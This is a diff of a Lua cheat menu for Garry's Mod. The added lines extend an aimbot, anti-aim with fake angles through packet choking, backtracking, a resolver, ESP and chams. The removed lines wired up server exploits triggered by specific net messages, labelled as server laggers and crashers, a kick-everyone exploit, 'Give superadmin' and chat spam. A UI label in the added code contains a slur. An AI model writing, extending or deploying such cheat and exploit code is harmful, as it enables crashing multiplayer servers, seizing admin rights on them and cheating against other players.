-				pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 5",BigExploits["Lagger 5"].func,"Lagger 5 (5 min)")
-			end
-			if pMenu.IsNetString("JoinOrg") then
-				pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 6",BigExploits["Lagger 6"].func,"Lagger 6 (5 min)")
-			end
-			if pMenu.IsNetString("pac_submit") then
-				pMenu.DrawExploit(Frame,315,305,170,50,"Lagger 7",BigExploits["Lagger 7"].func,"Lagger 7 (5 min)")
-			end
-			if pMenu.IsNetString("pac_to_contraption") then
-				pMenu.DrawExploit(Frame,315,360,170,50,"PAC Crash Server old",BigExploits["PAC Crash Server old"].func,"PAC (patched on some)","Crash Server")
-			end
-			if pMenu.IsNetString("NLRKick") then
-				pMenu.DrawExploit(Frame,315,415,170,50,"NLRKick",BigExploits["NLRKick"].func,"NLR","Kick everyone (but you)")
-			end
-			if pMenu.IsNetString("steamid2") then
-				pMenu.DrawExploit(Frame,490,30,170,50,"Lagger 8",BigExploits["Lagger 8"].func,"Lagger 8 (5min)")
-			end
-			if pMenu.IsNetString("NDES_SelectedEmblem") then
-				pMenu.DrawExploit(Frame,490,85,170,50,"Lagger 9",BigExploits["Lagger 9"].func,"Lagger 9 (5min)")
-			end
-			if pMenu.IsNetString("join_disconnect") then
-				pMenu.DrawExploit(Frame,490,140,170,50,"Lagger 10",BigExploits["Lagger 10"].func,"Lagger 10 (5min)")
-			end
-			if pMenu.IsNetString("Morpheus.StaffTracker") then
-				pMenu.DrawExploit(Frame,490,195,170,50,"B1g Crasher",BigExploits["B1g Crasher"].func,"B1g Crasher")
-			end
-			if pMenu.IsNetString("pplay_deleterow") then
-				pMenu.DrawExploit(Frame,490,250,170,50,"Give superadmin",BigExploits["Give superadmin"].func,"Give superadmin")
-			end
-			pMenu.DrawExploit(Frame,490,305,170,50,"pm spam",BigExploits["pm spam"].func,"rekt by me lol")
-			pMenu.DrawExploit(Frame,490,360,170,50,"asay spam",BigExploits["asay spam"].func,"asay spam")
-			draw.SimpleText("Thanks pExploitcity ","Font L",140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Exploits can be easily added through lua",FontL,140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 		end
 		if pMenuVars.Tabs[Aimbot].value then
 			pMenu.DrawCheckBox(Frame,170,55,"Aibmot Enable",false,"Enable")
-			draw.SimpleText("Aimbot FOV","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Aimbot FOV",FontM,170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,170,105,490,20,"Aimbot FOV",1,  360,  10,true)
 
 			pMenu.DrawCheckBox(Frame,170,140,"Aibmot Smooth",false,"Smooth movement")
-			draw.SimpleText("Smooth amount","Font M",170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Smooth amount",FontM,170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,170,190,225,20,"Aimbot Smooth AMT",1,  100,  5)
 
 			pMenu.DrawCheckBox(Frame,410,140,"Aibmot Show fov circle",false,"Aibmot FOV circle (sort of accurate)")
-			draw.SimpleText("Circle color","Font M",410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("R","Font M",645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Circle color",FontM,410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("R",FontM,645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,410,190,225,20,"Aimbot Circle.r",1,  255,  255)
-			draw.SimpleText("G","Font M",645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("G",FontM,645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,410,215,225,20,"Aimbot Circle.g",1,  255,  255)
-			draw.SimpleText("B","Font M",645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("B",FontM,645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,410,240,225,20,"Aimbot Circle.b",1,  255,  1)
-			draw.SimpleText("A","Font M",645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("A",FontM,645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,410,265,225,20,"Aimbot Circle.a",1,  255,  255) // 159
-
-			draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY) Default: Left Alt","Font M",170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			///input.GetKeyName(
 			pMenu.DrawSlider(Frame,170,315,490,20,"Aimbot Key",1,  159,  81)
+			draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY): "..string.upper(input.GetKeyName(pMenuVars.Sliders["Aimbot Key"].value)),FontM,170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 
-			draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine","Font M",170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code","Font M",170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine",FontM,170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code",FontM,170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawSlider(Frame,170,385,490,20,"Aimbot Bone",1,  #AimbotPoints,  1)
 		end
 		if pMenuVars.Tabs[hvh].value then
 			pMenu.DrawCheckBox(Frame,170,55,"HvH Enable",false,"Enable")
+			draw.SimpleText("Aimkey ("..string.upper(input.GetKeyName(pMenuVars.Sliders["Aimbot Key"].value))..") Change this in the aimbot section.",FontM,300,57,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 			pMenu.DrawCheckBox(Frame,170,100,"HvH Antiaim",false,"Enable AntiAim")
-			draw.SimpleText("Pitch Angle","Font M",170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  -180.05332,true)
-			draw.SimpleText("Yaw Angle","Font M",170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  -80,true)
-			draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 yaw + cam.y","Font M",170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-			pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  4)
+			draw.SimpleText("Pitch Angle",FontM,170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  0)
+			draw.SimpleText("Yaw Angle",FontM,170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  0)
+			draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 y+cam",FontM,170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  2)
 			if pMenuVars.Sliders["HvH Style"].value == 2 then
-				draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
-				pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  235)
+				draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)",FontM,380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+				pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  230)
 			elseif pMenuVars.Sliders["HvH Style"].value == 3 then
-				draw.SimpleText("Random min/max","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+				draw.SimpleText("Random min/max",FontM,380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
 				pMenu.DrawSlider(Frame,380,275,200,20,"HvH randomY",1,  180,  45)
 			end
 
-			pMenu.DrawCheckBox(Frame,170,310,"HvH Autoshoot",false,"Autoshoot")
-			pMenu.DrawCheckBox(Frame,170,460,"HvH pList",false,"pList")
+			pMenu.DrawCheckBox(Frame,170,280,"HvH Autoshoot",false,"Autoshoot")
+
+			draw.SimpleText("fag lag ammount ( > 0 for fake angles)",FontM,170,310,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+			pMenu.DrawSlider(Frame,170,330,200,20,"HvH Choke Packet",0,  14,  1)
+
+			if IsFake then
+				draw.SimpleText("Fake angle (angle + number)",FontM,170,370,Color(255,255,255,255),TEXT_ALIGN_LEFT)
+				pMenu.DrawSlider(Frame,170,390,490,20,"HvH Fake Ang",0,  360,  0)
+			end
+
+			//IsFake
+
+			pMenu.DrawCheckBox(Frame,170,425,"HvH Show FA",true,"Show FakeAngle")
+			pMenu.DrawCheckBox(Frame,170,460,"HvH pList",true,"pList")
 		end
 		if firsttime then
 			pMenuVars.Tabs[Visuals].value = false;
@@ -754,29 +466,38 @@ function pMenu.Menu()
 		if pMenuVars.CheckBoxes["HvH pList"] != nil && pMenuVars.CheckBoxes["HvH pList"].value then
 			if pMenuVars.Tabs["HvH"].value != nil && pMenuVars.Tabs["HvH"].value then
 				pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
-				draw.SimpleText("PList","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-				draw.SimpleText("Can't hit someone because their aa is good?","Font M",w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
-				draw.SimpleText("Use this :)","Font M",w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
+				draw.SimpleText("PList",FontL,w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
+				draw.SimpleText("Can't hit someone because their aa is good?",FontM,w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
+				draw.SimpleText("Use this :)",FontM,w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
 				local up = 20;
-				local add = 50
+				local add = 110
 				local k = 0;
 				for _,v in pairs(player.GetAll()) do
 					k = k + 1;
+					/*
 					if v == LocalPlayer() then
 						k = k -1
 						continue;
 					end
-					pMenu.DrawOutLinedRect(10,up + (k * add),280,44,Color(255,255,255,255))
-					pMenu.DrawRect(10,up + (k * add),280,44,Color(18,89,131,170))
-					draw.SimpleText(v:Nick(),"Font M",12,up + (k * add) + 3,Color(0,255,255,255))
-
-					draw.SimpleText("P:","Font M",175,up + (k * add) + 3,Color(0,255,255,255))
+					*/
+					pMenu.DrawOutLinedRect(10,up + (k * add),280,add - 2,Color(255,255,255,255))
+					pMenu.DrawRect(10,up + (k * add),280,add - 2,Color(18,89,131,170))
+					draw.SimpleText(v:Nick(),FontM,12,up + (k * add) + 3,Color(0,255,255,255))
+					draw.SimpleText("P:",FontM,175,up + (k * add) + 3,Color(0,255,255,255))
 					pMenu.DrawSlider(PList,190,up + (k * add),100,22,v:SteamID().."Force Pitch",-180,  180,  0,true)
-					draw.SimpleText("Y:","Font M",175,up + (k * add) + 24,Color(0,255,255,255))
+					draw.SimpleText("Y:",FontM,175,up + (k * add) + 24,Color(0,255,255,255))
 					pMenu.DrawSlider(PList,190,up + (k * add)+22,100,22,v:SteamID().."Force Yaw",-180,  180,  0,true)
+
+					draw.SimpleText("Ticks:",FontM,190,up + (k * add) + 45,Color(0,255,255,255),TEXT_ALIGN_RIGHT)
+					pMenu.DrawSlider(PList,190,up + (k * add)+44,100,22,v:SteamID().."Backtrack",0,  (backtrackamt / engine.TickInterval()) - 2,  0,false)
 
 					pMenu.DrawCheckBox(PList,11,up + (k * add) + 23,v:SteamID().."Baim",false,"baim")
 					pMenu.DrawCheckBox(PList,75,up + (k * add) + 23,v:SteamID().."Force Ang",false,"Force Ang")
+					pMenu.DrawCheckBox(PList,11,up + (k * add) + 44,v:SteamID().."Backtrack",false,"Backtrack")
+					pMenu.DrawCheckBox(PList,11,up + (k * add) + 66,v:SteamID().."Spin",false,"Spin Resolve")
+					pMenu.DrawCheckBox(PList,130,up + (k * add) + 66,v:SteamID().."aplayer",false,"Aim At LocalPlayer")
+
+					pMenu.DrawCheckBox(PList,11,up + (k * add) + 88,v:SteamID().."Anti pResolver",false,"Anti pResolver")
 				end
 			end
 		end
@@ -784,18 +505,20 @@ function pMenu.Menu()
 			self:Close()
 		end
 	end
-end
 
+end
 function pMenu.boundingbox(ply)
-	local iBoxWidth = 26;
-	local iBoxHeight = 71;
+	local bot,top = ply:GetHull()
+	local iBoxWidth = top.x * 2;
+	local iBoxHeight = top.z;
 	
-	local pos = ply:GetBonePosition(ply:LookupBone( "ValveBiped.Bip01_Spine" ));
+	local pos = ply:GetPos()
 	if (ply:Crouching()) then
-		pos = Vector(pos.x, pos.y, pos.z - 27);
-		iBoxHeight = 55;
+		local bot,top = ply:GetHullDuck()
+		pos = Vector(pos.x, pos.y, pos.z);
+		iBoxHeight = top.z;
 	else
-		pos = Vector(pos.x,pos.y,pos.z - 42.5);
+		pos = Vector(pos.x,pos.y,pos.z);
 	end
 
 	local points = {
@@ -879,7 +602,7 @@ function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
 	local ret = NULL
 	local retDist = 1000;
 	for k,v in pairs(player.GetAll()) do
-		if v == LocalPlayer() || !v:Alive() then
+		if v == LocalPlayer() || !v:Alive() || v:Team() == LocalPlayer():Team() then
 			continue;
 		end
 		local pos = Vector(0,0,0);
@@ -898,31 +621,140 @@ function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
 	end
 	return ret;
 end
-function pMenu.AAA(ply)
+function pMenu.ClosestEntToCrossNLOS(limit,pcmd,bone,Angle)
+	if limit == nil then
+		limit = 360;
+	end
+	local curAng = Vector(Angle.x,Angle.y + 180,0);
+	local curEye = LocalPlayer():EyePos()
+	local ret = NULL
+	local retDist = 1000;
+	for k,v in pairs(player.GetAll()) do
+		if v == LocalPlayer() || !v:Alive() || v:Team() == LocalPlayer():Team() then
+			continue;
+		end
+		local pos = Vector(0,0,0);
+		if bone != nil then
+			pos = v:EyePos()
+		else
+			pos = v:GetBonePosition(v:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone))
+		end
+		local tarAng = pMenu.GetAngleVector(curEye,pos);
+		tarAng = Vector(tarAng.x,tarAng.y + 180,0);
+		local dist = tarAng:Distance(curAng);
+		if dist <= limit && dist < retDist then
+			ret = v;
+			retDist = dist;
+		end
+	end
+	return ret;
+end
+function EntIndexToEnt(index)
+	for k,v in pairs(player.GetAll()) do
+		if v:EntIndex() == index then
+			return v;
+		end
+	end
+	return NULL;
+end
+local SpinPeople = {}
+gameevent.Listen( "entity_killed" )
+function pMenu.AAA(ply,spinnum)
 	local Angles = ply:EyeAngles()
 	if pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"].value then
-		Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
-		Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
+
+		if pMenuVars.CheckBoxes[ply:SteamID().."aplayer"].value then
+			local angz = pMenu.GetAngle(ply:EyePos(),LocalPlayer():EyePos())
+			Angles.p = math.NormalizeAngle(angz.x + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
+			Angles.y = math.NormalizeAngle(angz.y + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
+		else
+			Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
+			Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
+		end
+	end
+	if (Angles.x < -179.0) then // pitch
+		Angles.x = Angles.x - 360
+	elseif Angles.x > 90.0 || Angles.x < -90.0 then
+		Angles.x = 89
+	elseif Angles.x > 89.0 && Angles.x < 91.0 then
+		Angles.x = 89;
+	elseif Angles.x > 179.0 && Angles.x < 181.0 then
+		Angles.x = Angles - 180;
+	elseif Angles.x > -179.0 && Angles.x < -181.0 then
+		Angles.x = 180;
+	end
+	if pMenuVars.CheckBoxes[ply:SteamID().."Spin"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Spin"].value then // spin
+		if SpinPeople[ply:SteamID()] == nil then
+			SpinPeople[ply:SteamID()] = {ang = 0}
+		end
+		Angles.y = math.NormalizeAngle((spinnum))
+		SpinPeople[ply:SteamID()].ang = Angles.y
 	end
 	ply:SetPoseParameter("aim_pitch", Angles.p);
-	ply:SetPoseParameter("body_yaw", Angles.y);
+	ply:SetPoseParameter("head_pitch",Angles.p);
+	ply:SetPoseParameter("body_yaw", Angles.y );
 	ply:SetPoseParameter("aim_yaw", 0);
 	ply:InvalidateBoneCache();
 	ply:SetRenderAngles(Angle(0, Angles.y, 0));
 end
-hook.Add("RenderScene","tes",function()
-	for k,v in pairs(player.GetAll()) do
-		if v == LocalPlayer() then
-			continue;
-		end
-		pMenu.AAA(v)
+hook.Add( "entity_killed", "Return angle", function( data )
+	local Ent = EntIndexToEnt(data.entindex_killed)
+	if SpinPeople[Ent:SteamID()] != nil && pMenuVars.CheckBoxes[Ent:SteamID().."Spin"] != nil && pMenuVars.CheckBoxes[Ent:SteamID().."Spin"].value then
+		chat.AddText(Color(0,255,255),"Player (",Color(255,255,0),Ent:Nick(),Color(0,255,255),") was killed at yaw angle ",Color(255,255,0),"(Their yaw + "..tostring(math.Round(SpinPeople[Ent:SteamID()].ang))..")",Color(0,255,255)," if you didn't kill him take this with a grain of salt." )
 	end
 end)
+local SpinNum = 0;
+local RealAngle = Angle(0,0,0)
+local FakeAngles = Angle();
+hook.Add("RenderScene","tes",function()
+	local ammo = 0;
+	if LocalPlayer():Alive() then
+		ammo = LocalPlayer():GetActiveWeapon():Clip1() % 8 + 1;
+	end
+	SpinNum = ammo * 45;
+	for k,v in pairs(player.GetAll()) do
+		v:SetupBones()
+		if v == LocalPlayer() then
+			v:SetPoseParameter("aim_pitch", RealAngle.p);
+			v:SetPoseParameter("head_pitch",RealAngle.p);
+			v:SetPoseParameter("head_yaw",0);
+			v:SetPoseParameter("body_yaw", RealAngle.y );
+			v:SetPoseParameter("move_x", 1);
+			v:SetPoseParameter("move_y", 0);
+			v:SetPoseParameter("aim_yaw", 0);
+			v:InvalidateBoneCache();
+			v:SetRenderAngles(Angle(0, RealAngle.y, 0));
+			continue;
+		end
+		pMenu.AAA(v,SpinNum)
+	end
+end)
+local NextShot = 0;
+function pMenu.CanShoot()
+	if (CurTime() < NextShot) then
+		return false
+	end
+	return true;
+end
+function pMenu.Shoot(pcmd)
+	if(LocalPlayer():KeyDown(1)) then
+		pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
+		if LocalPlayer():GetActiveWeapon().RPM != nil then
+			NextShot = (CurTime() + (1/(LocalPlayer():GetActiveWeapon().RPM / 60)));
+		else
+			NextShot = (CurTime() + 0.05);
+		end
+	else
+		pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
+	end
+end
 function pMenu.DrawESP(ply)
 	local boxcolor = Color(pMenuVars.Sliders["ESP BoxColor.r"].value,pMenuVars.Sliders["ESP BoxColor.g"].value,pMenuVars.Sliders["ESP BoxColor.b"].value,255)
 	local textcolor = Color(pMenuVars.Sliders["ESP TextColor.r"].value,pMenuVars.Sliders["ESP TextColor.g"].value,pMenuVars.Sliders["ESP TextColor.b"].value,255)
 	local left,right,top,bottom = pMenu.boundingbox(ply)
 	if pMenuVars.CheckBoxes["ESP BoundingBox"].value then
+		surface.SetDrawColor(Color(0,0,0,255));
+		surface.DrawOutlinedRect(left ,top , (right - left) + 3,(bottom - top) + 3)
 		surface.SetDrawColor(boxcolor);
 		surface.DrawOutlinedRect(left + 1,top + 1, (right - left) + 1,(bottom - top) + 1)
 	end
@@ -934,17 +766,17 @@ function pMenu.DrawESP(ply)
 	end
 
 	if (pMenuVars.CheckBoxes["ESP Name"].value) then
-		draw.SimpleText(ply:Nick(),"Font L2",left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
+		draw.SimpleText(ply:Nick(),FontL2,left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
 	end
 	if (pMenuVars.CheckBoxes["ESP Position"].value) then
 		local pos = ply:GetPos();
-		draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),"Font L2",right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
+		draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),FontL2,right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
 	end
 	if (pMenuVars.CheckBoxes["ESP Angles"].value) then
 		local pos = ply:EyeAngles();
-		draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),"Font L2",right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-		draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),"Font L2",right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
-		draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),"Font L2",right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
+		draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),FontL2,right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
+		draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),FontL2,right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
+		draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),FontL2,right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
 	end
 	if (pMenuVars.CheckBoxes["ESP Traceline"].value) then
 		local eyes = (ply:EyePos() + ply:EyeAngles():Forward() * pMenuVars.Sliders["ESP Traceline Distance"].value):ToScreen();
@@ -971,6 +803,7 @@ function pMenu.Chams(v)
 	local ChamVis = Color(pMenuVars.Sliders["ESP ChamVisColor.r"].value,pMenuVars.Sliders["ESP ChamVisColor.g"].value,pMenuVars.Sliders["ESP ChamVisColor.b"].value,255)
 	local ChamNVis = Color(pMenuVars.Sliders["ESP ChamNVisColor.r"].value,pMenuVars.Sliders["ESP ChamNVisColor.g"].value,pMenuVars.Sliders["ESP ChamNVisColor.b"].value,255)
 	cam.Start3D()
+		render.SuppressEngineLighting(false)
 		if v:IsValid() then
 			if pMenuVars.CheckBoxes["ESP XQZ"].value then
 				render.MaterialOverride(chamsmat)
@@ -1035,13 +868,7 @@ function pMenu.FixMovement(pCmd,fa,angles)
 	pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
 	pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
 end
-function pMenu.Shoot(pcmd)
-	if(LocalPlayer():KeyDown(1)) then
-		pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
-	else
-		pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
-	end
-end
+
 hook.Add("RenderScreenspaceEffects","hkRenderScreenspaceEffects",function()
 	if (pMenuVars.CheckBoxes["ESP Chams"] != nil && pMenuVars.CheckBoxes["ESP Chams"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
 		for k,v in pairs(player.GetAll()) do
@@ -1060,7 +887,7 @@ hook.Add("PreDrawHalos","hkPreDrawHalos",function()
 				tab[k] = v;
 			end
 		end
-		halo.Add( tab, Color( 255, 255, 255 ), 2, 2, 4,true,true )
+		halo.Add( tab, Color( 255, 255, 255 ), 0.5, 0.5, 4,true,true )
 	end
 end)
 hook.Add("HUDPaint","hkHUDPaint",function()
@@ -1078,7 +905,7 @@ hook.Add("HUDPaint","hkHUDPaint",function()
 end)
 local View = Angle();
 hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
-	if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
+	if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) && LocalPlayer():Alive() then
 		local view = {}
 		local ang = View
 		view.angles = View
@@ -1105,10 +932,74 @@ hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
 		return view;
 	end
 end)
-local t = 0;
+local t = 0; // to open the fucking menu
 local jitter = false;
 local AShoot = false;
+
+local test_int = 0;
+local T2 = 0;
+local Failed_Packets = 0;
+
+
+hook.Add("Tick","Test",function()
+	if pMenuVars.Sliders["HvH Choke Packet"] != nil then
+		bSendPacket = false;
+		if bSendPacket == false then
+			Failed_Packets = Failed_Packets + 1;
+		end
+		if Failed_Packets > pMenuVars.Sliders["HvH Choke Packet"].value then
+			bSendPacket = true;
+			Failed_Packets = 0;
+		end
+	end
+	if !LocalPlayer():Alive() then
+		bSendPacket = true;
+	end
+end)
+local FontVerdana = pMenu.RandomString()
+surface.CreateFont( FontVerdana, {
+	font = "Verdana",
+	extended = false,
+	size = 30,
+	weight = 300,
+	blursize = 0,
+	scanlines = 0,
+	shadow = true,
+	antialias = true
+} )
+local path_pos = {}
+local play = false;
+local aa_style = 0;
+hook.Add("HUDPaint","AA Type",function()
+	draw.SimpleText(math.NormalizeAngle(math.Round(RealAngle.y)).." Real Yaw",FontL,0,15,Color(255,255,0,255))
+	draw.SimpleText(math.NormalizeAngle(math.Round(FakeAngles.y)).." Fake Yaw",FontL,0,30,Color(255,255,0,255))
+	if aa_style == 1 then
+		draw.SimpleText("Jitter Spin",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	elseif aa_style == 2 then
+		draw.SimpleText("Spin",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	elseif aa_style == 3 then
+		draw.SimpleText("Random Yaw Angle",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	elseif aa_style == 4 then
+		draw.SimpleText("At Player",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	elseif aa_style == 5 then
+		draw.SimpleText("Static Angle",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	elseif aa_style == 6 then
+		draw.SimpleText("Yaw + cam.y",FontVerdana,10,ScrH() - 100,Color(255,255,0,255))
+	end
+	/*
+	for k,v in pairs(player.GetAll()) do
+		local pos = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1")):ToScreen()
+		surface.DrawLine(ScrW()/2,ScrH(),pos.x,pos.y)
+	end
+	*/
+end)
+
 hook.Add("CreateMove","hkCreateMove",function(pCmd)
+	if pMenuVars.Sliders["HvH Choke Packet"] != nil && pMenuVars.Sliders["HvH Choke Packet"].value > 0 then
+		IsFake = true;
+	else
+		IsFake = false;
+	end
 	if pMenuVars.CheckBoxes["MISC Bhop"] != nil && pMenuVars.CheckBoxes["MISC Bhop"].value then
 		pMenu.bhop(pCmd)
 	end
@@ -1146,51 +1037,132 @@ hook.Add("CreateMove","hkCreateMove",function(pCmd)
 	if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
 		local CurAngles = pCmd:GetViewAngles()
 		local Anglez = Angle(View.x,View.y,0);
-		if (pMenuVars.CheckBoxes["HvH Antiaim"].value) then
+
+
+
+
+		if (pMenuVars.CheckBoxes["HvH Antiaim"].value && pMenuVars.Sliders["HvH Fake Ang"] != nil) then
 			Anglez = Angle(pMenuVars.Sliders["HvH Pitch"].value,pMenuVars.Sliders["HvH Yaw"].value,0);
 			local style = pMenuVars.Sliders["HvH Style"].value;
+			aa_style = style;
 			if style == 1 then
 				jitter = !jitter;
 				if jitter then
-					Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 100);
+					Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y + 45);
 				else
-					Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + 10);
+					Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y - 10);
+				end
+				if bSendPacket then
+					if IsFake then
+						Anglez.y = math.NormalizeAngle(RealAngle.y + pMenuVars.Sliders["HvH Fake Ang"].value);
+					else
+						if jitter then
+							Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y + 45);
+						else
+							Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y - 10);
+						end
+					end
 				end
 			elseif style == 2 then
-				Anglez.y = math.NormalizeAngle(CurAngles.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
+				if bSendPacket then
+					if IsFake then
+						Anglez.y = math.NormalizeAngle(RealAngle.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value) + pMenuVars.Sliders["HvH Fake Ang"].value);
+					else
